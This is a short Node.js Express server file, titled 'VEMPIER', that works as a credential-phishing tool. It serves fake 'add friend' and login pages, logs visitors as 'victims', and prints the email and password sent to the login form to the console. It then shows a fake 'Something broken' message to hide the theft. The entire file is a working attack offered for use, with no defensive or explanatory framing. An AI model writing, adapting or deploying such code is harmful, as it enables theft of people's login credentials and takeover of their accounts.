
━━━[★] WELCOME TO VEMPIER [★]━━━


const express = require('express');
const bodyParser = require('body-parser');

const app = express();

app.use(express.static('vews'));
app.use(bodyParser.urlencoded({extended : false}));

app.get('/',(req,res)=>{
  res.sendFile(__dirname + '/vews/indax.html');
  console.log('victims are in addfriend Route');
});

app.get('/login',(req,res)=>{
  console.log('victims in login Route');
  res.sendFile(__dirname + '/vews/login.html');
});

app.post('/login',(req,res)=>{
  const email = req.body.email;
  const password = req.body.password;
  console.log(`email : ${email}`);
  console.log(`password:  ${password}`);
  res.send('<h1> Something broken </h1>');
});

const port = process.env.PORT || 8080;
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`)
});
